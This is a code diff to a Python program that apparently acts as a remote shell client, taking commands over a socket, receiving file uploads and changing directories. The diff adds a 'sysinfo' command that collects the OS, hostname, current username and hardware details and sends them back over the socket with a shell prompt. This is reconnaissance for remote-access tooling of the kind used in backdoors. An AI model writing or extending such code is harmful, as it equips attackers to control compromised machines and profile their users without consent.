@@ -6,6 +6,8 @@ import json
 import time
 import sys
 import hashlib
+import platform
+import getpass
 
 # Load configuration from config.json
 def load_config():
@@ -204,6 +206,19 @@ def execute_commands(s):
                         continue
                     log_message(f"Upload incoming: {filename}")
                     receive_file(s, filename)
+                    continue
+                
+                if cmd == "sysinfo":
+                    info = f"""
+=== System Information ===
+OS: {platform.system()} {platform.release()}
+Version: {platform.version()}
+Hostname: {platform.node()}
+Username: {getpass.getuser()}
+Architecture: {platform.machine()}
+Processor: {platform.processor()}
+"""
+                    s.send(info.encode() + os.getcwd().encode() + b"> ")
                     continue
                 
                 if data[:2].decode("utf-8") == 'cd':
